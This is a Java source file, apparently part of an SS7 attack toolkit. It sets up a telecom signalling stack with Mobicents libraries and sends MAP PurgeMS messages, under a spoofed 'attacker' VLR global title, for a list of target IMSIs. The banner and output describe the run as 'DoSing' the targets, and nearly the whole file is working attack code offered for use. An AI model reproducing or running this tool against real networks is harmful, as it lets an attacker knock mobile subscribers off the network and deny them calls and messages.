/**
 * Created by gh0 on 2/8/18.
 */




import org.apache.log4j.Logger;
import org.mobicents.protocols.api.IpChannelType;
import org.mobicents.protocols.sctp.ManagementImpl;
import org.mobicents.protocols.ss7.indicator.NatureOfAddress;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.m3ua.ExchangeType;
import org.mobicents.protocols.ss7.m3ua.Functionality;
import org.mobicents.protocols.ss7.m3ua.IPSPType;
import org.mobicents.protocols.ss7.m3ua.impl.M3UAManagementImpl;
import org.mobicents.protocols.ss7.m3ua.impl.parameter.ParameterFactoryImpl;
import org.mobicents.protocols.ss7.m3ua.parameter.RoutingContext;
import org.mobicents.protocols.ss7.m3ua.parameter.TrafficModeType;
import org.mobicents.protocols.ss7.map.MAPStackImpl;
import org.mobicents.protocols.ss7.map.api.*;
import org.mobicents.protocols.ss7.map.api.dialog.*;
import org.mobicents.protocols.ss7.map.api.errors.MAPErrorMessage;
import org.mobicents.protocols.ss7.map.api.primitives.*;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPDialogMobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPServiceMobilityListener;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ForwardCheckSSIndicationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ResetRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.*;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeRequest_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeResponse_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.*;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.DeleteSubscriberDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.DeleteSubscriberDataResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.InsertSubscriberDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.InsertSubscriberDataResponse;
import org.mobicents.protocols.ss7.sccp.OriginationType;
import org.mobicents.protocols.ss7.sccp.RuleType;
import org.mobicents.protocols.ss7.sccp.SccpProvider;
import org.mobicents.protocols.ss7.sccp.SccpResource;
import org.mobicents.protocols.ss7.sccp.impl.SccpStackImpl;
import org.mobicents.protocols.ss7.sccp.parameter.GlobalTitle0100;
import org.mobicents.protocols.ss7.sccp.parameter.SccpAddress;
import org.mobicents.protocols.ss7.tcap.TCAPStackImpl;
import org.mobicents.protocols.ss7.tcap.api.TCAPStack;
import org.mobicents.protocols.ss7.tcap.asn.ApplicationContextName;
import org.mobicents.protocols.ss7.tcap.asn.comp.Problem;


import java.util.Scanner;


abstract class PurgeLowLevel implements MAPDialogListener, MAPServiceMobilityListener {


    // MTP Details
    int CLIENT_SPC ;
    int SERVER_SPC ; //PC of adjacent STP

    int NETWORK_INDICATOR ;  //International

    final int SERVICE_INDICATOR = 3; // SCCP
    final int SSN_Client = 7; //VLR SSN
    final int SSN_Server = 6; //HLR SSN


    // M3UA details
    String CLIENT_IP ;
    int CLIENT_PORT ;

    String SERVER_IP ;
    int SERVER_PORT ;


    protected final String CLIENT_ASSOCIATION_NAME = "clientAsscoiation";

    String attacker_vlr;

    String target_imsi[];
    String target_hlr[];



    final ParameterFactoryImpl factory = new ParameterFactoryImpl();

    PurgeLowLevel() {
        init();
    }

    private void init() {
        try {
            Scanner user_input = new Scanner(System.in);


            System.out.print("\033[34m[*]\033[0mSet Client PC: ");
            CLIENT_SPC = user_input.nextInt();
            System.out.print("\033[34m[*]\033[0mSet Peer PC: ");
            SERVER_SPC = user_input.nextInt();


            System.out.print("\033[34m[*]\033[0mSet Client IP: ");
            CLIENT_IP = user_input.next();
            System.out.print("\033[34m[*]\033[0mSet Client Port: ");
            CLIENT_PORT = user_input.nextInt();
            System.out.print("\033[34m[*]\033[0mSet Peer IP: ");
            SERVER_IP = user_input.next();
            System.out.print("\033[34m[*]\033[0mSet Peer Port: ");
            SERVER_PORT = user_input.nextInt();

            System.out.print("\033[34m[*]\033[0mSet Network Indicator [0] International [2] National: ");
            NETWORK_INDICATOR = user_input.nextInt();


            System.out.print("\033[34m[*]\033[0mSet Target's IMSI(s) (space separated): ");
            user_input.nextLine();
            target_imsi = user_input.nextLine().split(" ");

            System.out.print("\033[34m[*]\033[0mSet Target's IMSI(s) in GT Format [ mcc+mnc+msin --> cc+ndc+msin ]: ");
            target_hlr = user_input.nextLine().split(" ");


            System.out.print("\033[34m[*]\033[0mSet your GT: ");
            attacker_vlr = user_input.next();


            System.out.println("\033[34m[*]\033[0mStack components are set...");
            System.out.println("\033[34m[*]\033[0mInitializing the Stack...");


        } catch (Exception ex) {
            System.out.println("\033[31m[-]\033[0mError: " + ex);
            throw new RuntimeException(ex);

        }

    }
}




public class PurgeMS extends PurgeLowLevel  {

    private static Logger logger = Logger.getLogger(PurgeMS.class);

    // SCTP
    private ManagementImpl sctpManagement;

    // M3UA
    private M3UAManagementImpl clientM3UAMgmt;

    // SCCP
    private SccpStackImpl sccpStack;
    private SccpProvider sccpProvider;
    private SccpResource sccpResource;

    // TCAP
    private TCAPStack tcapStack;

    // MAP
    private MAPStackImpl mapStack;
    private MAPProvider mapProvider;


    public PurgeMS() {
        // TODO Auto-generated constructor stub
    }

    private void initializeStack(IpChannelType ipChannelType) throws Exception {

        this.initSCTP(ipChannelType);

        // Initialize M3UA first
        this.initM3UA();

        // Initialize SCCP
        this.initSCCP();

        // Initialize TCAP
        this.initTCAP();

        // Initialize MAP
        this.initMAP();

        // FInally start ASP
        this.clientM3UAMgmt.startAsp("ASP1");
    }

    private void initSCTP(IpChannelType ipChannelType) throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack ....");
        try{
            this.sctpManagement = new ManagementImpl("Client");
            this.sctpManagement.setSingleThread(true);
            this.sctpManagement.start();
            this.sctpManagement.setConnectDelay(10000);
            this.sctpManagement.removeAllResourses();

            // 1. Create SCTP Association
            sctpManagement.addAssociation(CLIENT_IP, CLIENT_PORT, SERVER_IP, SERVER_PORT, CLIENT_ASSOCIATION_NAME,
                    ipChannelType, null);
            System.out.println("\033[32m[+]\033[0mInitialized SCTP Stack ....");
        }catch(Exception e){
            System.out.println("\033[31m[-]\033[0mError initializing SCTP Stack: "+e.getMessage());
            System.exit(1);
        }
    }

    private void initM3UA() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing M3UA Stack ....");
        this.clientM3UAMgmt = new M3UAManagementImpl("Client", null);
        this.clientM3UAMgmt.setTransportManagement(this.sctpManagement);
        this.clientM3UAMgmt.start();
        this.clientM3UAMgmt.removeAllResourses();

        // m3ua as create rc
        RoutingContext rc = factory.createRoutingContext(new long[]{100l});
        TrafficModeType trafficModeType = factory.createTrafficModeType(TrafficModeType.Loadshare);

        try {
            this.clientM3UAMgmt.createAs("AS1", Functionality.IPSP, ExchangeType.SE, IPSPType.CLIENT, rc,
                    trafficModeType, 1, null);

            // Step 2 : Create ASP
            this.clientM3UAMgmt.createAspFactory("ASP1", CLIENT_ASSOCIATION_NAME);

            // Step3 : Assign ASP to AS
            this.clientM3UAMgmt.assignAspToAs("AS1", "ASP1");

            // Step 4: Add Route.
            clientM3UAMgmt.addRoute(SERVER_SPC, CLIENT_SPC, SERVICE_INDICATOR, "AS1");

            System.out.println("\033[32m[+]\033[0mInitialized M3UA Stack ....");
        } catch(Exception e) {
            System.out.println("\033[31m[-]\033[0mError initializing M3UA Stack: "+e.getMessage());
            System.exit(2);

        }

    }


    private void initSCCP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing SCCP Stack ....");
        try {
            this.sccpStack = new SccpStackImpl("MapLoadClientSccpStack");
            this.sccpStack.setMtp3UserPart(1, this.clientM3UAMgmt);

            this.sccpStack.start();
            this.sccpStack.removeAllResourses();

            this.sccpStack.getSccpResource().addRemoteSpc(1, SERVER_SPC, 0, 0);
            this.sccpStack.getSccpResource().addRemoteSsn(1, SERVER_SPC, SSN_Server, 0, false);

            this.sccpStack.getRouter().addMtp3ServiceAccessPoint(1, 1, CLIENT_SPC, NETWORK_INDICATOR, 0);

            this.sccpStack.getRouter().addMtp3Destination(1, 1, SERVER_SPC, SERVER_SPC, 0, 255, 255);


            this.sccpProvider = this.sccpStack.getSccpProvider();

            // SCCP routing table
            GlobalTitle0100 remotGTs = this.sccpProvider.getParameterFactory().createGlobalTitle
                    ("*", 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                            NatureOfAddress.INTERNATIONAL);

            //Replace The String with the GT of you SMCs
            GlobalTitle0100 localvlrGT = this.sccpProvider.getParameterFactory().createGlobalTitle
                    (attacker_vlr, 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                            NatureOfAddress.INTERNATIONAL);


            this.sccpStack.getRouter().addRoutingAddress
                    (1, this.sccpProvider.getParameterFactory().createSccpAddress
                            (RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remotGTs, SERVER_SPC, SSN_Server));

            this.sccpStack.getRouter().addRoutingAddress
                    (2, this.sccpProvider.getParameterFactory().createSccpAddress(
                            RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localvlrGT, CLIENT_SPC, SSN_Client));


            SccpAddress patternRemote = this.sccpProvider.getParameterFactory().createSccpAddress(
                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remotGTs, SERVER_SPC, SSN_Server);
            SccpAddress patternLocal = this.sccpProvider.getParameterFactory().createSccpAddress
                    (RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localvlrGT, CLIENT_SPC, SSN_Client);

            String maskRemote = "K";
            String maskLocal = "R";

            //translate local GT to its POC+SSN (local rule)GTT
            this.sccpStack.getRouter().addRule
                    (1, RuleType.SOLITARY, null, OriginationType.LOCAL, patternRemote, maskRemote, 1, -1, null, 0);
            this.sccpStack.getRouter().addRule
                    (2, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal, maskLocal, 2, -1, null, 0);

            System.out.println("\033[32m[+]\033[0mInitialized SCCP Stack ....");
        }catch(Exception e){
            System.out.println("\033[31m[-]\033[0mError initializing SCCP Stack: "+e.getMessage());
            System.exit(3);
        }
    }

    private void initTCAP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing TCAP Stack ....");
        try {
            this.tcapStack = new TCAPStackImpl("Test", this.sccpStack.getSccpProvider(), SSN_Client);
            this.tcapStack.start();
            this.tcapStack.setDialogIdleTimeout(60000);
            this.tcapStack.setInvokeTimeout(30000);
            this.tcapStack.setMaxDialogs(2000);
            System.out.println("\033[32m[+]\033[0mInitialized TCAP Stack ....");
        }catch(Exception e){
            System.out.println("\033[31m[-]\033[0mError initializing TCAP Stack: "+e.getMessage());
            System.exit(4);
        }
    }

    private void initMAP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing MAP Stack ....");

        try {
            this.mapStack = new MAPStackImpl("MAP-SMSC", this.tcapStack.getProvider());
            this.mapProvider = this.mapStack.getMAPProvider();

            this.mapProvider.addMAPDialogListener(this);
            this.mapProvider.getMAPServiceMobility().addMAPServiceListener(this);

            this.mapProvider.getMAPServiceMobility().acivate();

            this.mapStack.start();

            System.out.println("\033[32m[+]\033[0mInitialized MAP Stack ....");

        }catch(Exception e){
            System.out.println("\033[31m[-]\033[0mError initializing MAP Stack: "+e.getMessage());
            System.exit(5);
        }
    }

    private void initiatePurgeMS() throws Exception {

        int i = 0;
        while (i < target_imsi.length) {

            ISDNAddressString vlr = this.mapProvider.getMAPParameterFactory().createISDNAddressString(AddressNature.international_number,
                    NumberingPlan.ISDN,attacker_vlr);

            GlobalTitle0100 gtvlr = this.sccpProvider.getParameterFactory().createGlobalTitle
                    (attacker_vlr,0,org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY,null,
                            NatureOfAddress.INTERNATIONAL);

            SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory
                    ().createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtvlr, CLIENT_SPC, SSN_Client);

            IMSI imsi = this.mapProvider.getMAPParameterFactory
                    ().createIMSI(target_imsi[i]);

            GlobalTitle0100 calledPartyAddress = this.sccpProvider.getParameterFactory().createGlobalTitle
                    (target_hlr[i],0,org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY,null,
                            NatureOfAddress.INTERNATIONAL);

            SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory
                    ().createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, calledPartyAddress, SERVER_SPC, SSN_Server);

            try {
                // First create Dialog
                MAPDialogMobility mapDialogMobility = this.mapProvider.getMAPServiceMobility().createNewDialog
                        (MAPApplicationContext.getInstance(MAPApplicationContextName.msPurgingContext,
                                MAPApplicationContextVersion.version3),callingParty,null,calledParty,null);

                mapDialogMobility.addPurgeMSRequest(imsi,vlr,null,null);
                mapDialogMobility.send();

                System.out.println("\033[34m[*]\033[0mPurging IMSI : " + target_imsi[i]);


            }catch(MAPException e){
                System.out.println("\033[31m[-]\033[0mMAP Error: "+ e.getMessage());
                System.exit(6);
            }

            i++;
        }


        System.out.println("\033[34m[*]\033[0mDoSing " + target_imsi.length+" Targets"  + " is completed..");
        System.out.println("\033[34m[*]\033[0mClosing Session...");
        Thread.sleep(5000);
        System.exit(0);

        }



    public void onDialogAccept(MAPDialog mapDialog, MAPExtensionContainer extensionContainer) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("DialogAccept for DialogId=%d MAPExtensionContainer=%s",
                    mapDialog.getLocalDialogId(), extensionContainer));
        }
    }


    public void onDialogClose(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("DialogClose for Dialog=%d", mapDialog.getLocalDialogId()));
        }

    }

    public void onDialogDelimiter(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("DialogDelimiter for DialogId=%d", mapDialog.getLocalDialogId()));
        }
    }

    public void onDialogNotice(MAPDialog mapDialog, MAPNoticeProblemDiagnostic noticeProblemDiagnostic) {
        System.err.printf("\033[31m[-]\033[0mError: DialogNotice for DialogId=%d MAPNoticeProblemDiagnostic=%s\n ",
                mapDialog.getLocalDialogId(), noticeProblemDiagnostic);
        System.exit(7);
    }


    public void onDialogProviderAbort(MAPDialog mapDialog, MAPAbortProviderReason abortProviderReason,
                                      MAPAbortSource abortSource, MAPExtensionContainer extensionContainer) {
        System.err.printf("\033[31m[-]\033[0mError: DialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s\n",
                mapDialog.getLocalDialogId(), abortProviderReason, abortSource, extensionContainer);
        System.exit(8);
    }


    public void onDialogReject(MAPDialog mapDialog, MAPRefuseReason refuseReason,
                               ApplicationContextName alternativeApplicationContext, MAPExtensionContainer extensionContainer) {
        System.err.printf("[-]Error: DialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s\n",
                mapDialog.getLocalDialogId(), refuseReason, alternativeApplicationContext, extensionContainer);
        System.exit(9);
    }


    public void onDialogRelease(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("DialogResease for DialogId=%d", mapDialog.getLocalDialogId()));
        }
    }


    public void onDialogRequest(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
                                MAPExtensionContainer extensionContainer) {
        if (logger.isDebugEnabled()) {
            logger.debug(String
                    .format("DialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s MAPExtensionContainer=%s\n",
                            mapDialog.getLocalDialogId(), destReference, origReference, extensionContainer));
        }
    }


    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString addressString, AddressString addressString1, AddressString addressString2, AddressString addressString3) {

    }



    public void onDialogTimeout(MAPDialog mapDialog) {
        System.err.printf("033[31m[-]\033[0mError: DialogTimeout for DialogId=%d\n", mapDialog.getLocalDialogId());
        System.exit(10);

    }


    public void onDialogUserAbort(MAPDialog mapDialog, MAPUserAbortChoice userReason,
                                  MAPExtensionContainer extensionContainer) {
        System.err.printf("033[31m[-]\033[0mError: DialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s\n",
                mapDialog.getLocalDialogId(), userReason, extensionContainer);
        System.exit(11);
    }


    public void onErrorComponent(MAPDialog mapDialog, Long invokeId, MAPErrorMessage mapErrorMessage) {
        System.err.printf("\033[31m[-]\033[0mError: ErrorComponent for Dialog=%d and invokeId=%d MAPErrorMessage=%s\n",
                mapDialog.getLocalDialogId(), invokeId, mapErrorMessage);
        System.exit(12);
    }


    public void onRejectComponent(MAPDialog mapDialog, Long aLong, Problem problem, boolean b) {

    }


    public void onInvokeTimeout(MAPDialog mapDialog, Long invokeId) {
        System.err.printf("\033[31m[-]\033[0mError: MAP InvokeTimeout for Dialog=%d and invokeId=%d\n", mapDialog.getLocalDialogId(), invokeId);
        System.exit(13);
    }




    public void onMAPMessage(MAPMessage mapMessage) {
        // TODO Auto-generated method stub
    }






    public static void main(String args[]) {
        System.out.println("*********************************************");
        System.out.println("***             DoSing Target             ***");
        System.out.println("*********************************************");
        IpChannelType ipChannelType = IpChannelType.SCTP;


        final PurgeMS attacker = new PurgeMS();

        try {
            attacker.initializeStack(ipChannelType);

            // Lets pause for 20 seconds so stacks are initialized properly
            Thread.sleep(20000);
            attacker.initiatePurgeMS();


        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError: " + e);

            System.exit(15);

        }
    }





    public MAPProvider getMAPProvider() {
        return null;
    }




    @Override
    public void onUpdateLocationRequest(UpdateLocationRequest updateLocationRequest) {

    }

    @Override
    public void onUpdateLocationResponse(UpdateLocationResponse updateLocationResponse) {

    }

    @Override
    public void onCancelLocationRequest(CancelLocationRequest cancelLocationRequest) {

    }

    @Override
    public void onCancelLocationResponse(CancelLocationResponse cancelLocationResponse) {

    }

    @Override
    public void onSendIdentificationRequest(SendIdentificationRequest sendIdentificationRequest) {

    }

    @Override
    public void onSendIdentificationResponse(SendIdentificationResponse sendIdentificationResponse) {

    }

    @Override
    public void onUpdateGprsLocationRequest(UpdateGprsLocationRequest updateGprsLocationRequest) {

    }

    @Override
    public void onUpdateGprsLocationResponse(UpdateGprsLocationResponse updateGprsLocationResponse) {

    }

    @Override
    public void onPurgeMSRequest(PurgeMSRequest purgeMSRequest) {

    }

    @Override
    public void onPurgeMSResponse(PurgeMSResponse purgeMSResponse) {

    }

    @Override
    public void onSendAuthenticationInfoRequest(SendAuthenticationInfoRequest sendAuthenticationInfoRequest) {

    }

    @Override
    public void onSendAuthenticationInfoResponse(SendAuthenticationInfoResponse sendAuthenticationInfoResponse) {

    }

    @Override
    public void onAuthenticationFailureReportRequest(AuthenticationFailureReportRequest authenticationFailureReportRequest) {

    }

    @Override
    public void onAuthenticationFailureReportResponse(AuthenticationFailureReportResponse authenticationFailureReportResponse) {

    }

    @Override
    public void onResetRequest(ResetRequest resetRequest) {

    }

    @Override
    public void onForwardCheckSSIndicationRequest(ForwardCheckSSIndicationRequest forwardCheckSSIndicationRequest) {

    }

    @Override
    public void onRestoreDataRequest(RestoreDataRequest restoreDataRequest) {

    }

    @Override
    public void onRestoreDataResponse(RestoreDataResponse restoreDataResponse) {

    }

    @Override
    public void onAnyTimeInterrogationRequest(AnyTimeInterrogationRequest anyTimeInterrogationRequest) {

    }

    @Override
    public void onAnyTimeInterrogationResponse(AnyTimeInterrogationResponse anyTimeInterrogationResponse) {

    }


    @Override
    public void onProvideSubscriberInfoRequest(ProvideSubscriberInfoRequest provideSubscriberInfoRequest) {

    }

    @Override
    public void onProvideSubscriberInfoResponse(ProvideSubscriberInfoResponse provideSubscriberInfoResponse) {

    }

    @Override
    public void onInsertSubscriberDataRequest(InsertSubscriberDataRequest insertSubscriberDataRequest) {

    }

    @Override
    public void onInsertSubscriberDataResponse(InsertSubscriberDataResponse insertSubscriberDataResponse) {

    }

    @Override
    public void onDeleteSubscriberDataRequest(DeleteSubscriberDataRequest deleteSubscriberDataRequest) {

    }

    @Override
    public void onDeleteSubscriberDataResponse(DeleteSubscriberDataResponse deleteSubscriberDataResponse) {

    }

    @Override
    public void onCheckImeiRequest(CheckImeiRequest checkImeiRequest) {

    }

    @Override
    public void onCheckImeiResponse(CheckImeiResponse checkImeiResponse) {

    }

    @Override
    public void onActivateTraceModeRequest_Mobility(ActivateTraceModeRequest_Mobility activateTraceModeRequest_mobility) {

    }

    @Override
    public void onActivateTraceModeResponse_Mobility(ActivateTraceModeResponse_Mobility activateTraceModeResponse_mobility) {

    }
}